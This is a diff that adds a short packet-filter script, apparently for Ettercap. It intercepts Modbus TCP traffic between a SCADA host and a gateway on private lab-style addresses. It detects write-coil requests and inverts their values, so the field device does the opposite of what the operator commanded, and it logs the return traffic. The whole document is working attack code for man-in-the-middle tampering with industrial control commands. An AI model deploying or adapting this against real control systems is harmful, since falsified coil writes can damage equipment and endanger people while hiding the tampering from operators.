@@ -1,0 +1,25 @@
+if (ip.proto == TCP && tcp.dst == 502) {
+  if (ip.src == '192.168.60.10' && ip.dst == '192.168.65.10') {
+    msg("Found Modbus packet from scada to gateway");
+    
+    # edit coils write request value to be opposite to what was requested
+    if (search(DATA.data, "\x00\x06\x01\x05")) {
+      msg("found modbus write coil packet");
+      if (DATA.data+10 == 0x00) {
+        DATA.data+10 = 0xff;
+      }
+      else {
+        if (DATA.data+10 == 0xff) {
+          DATA.data+10 = 0x00;
+        }
+      }      
+    }
+  }
+}
+
+if (ip.proto == TCP && tcp.src == 502) {
+  if (ip.src == '192.168.65.10' && ip.dst == '192.168.60.10') {
+    msg("Found Modbus packet from gateway to scada"); 
+  }
+}
+
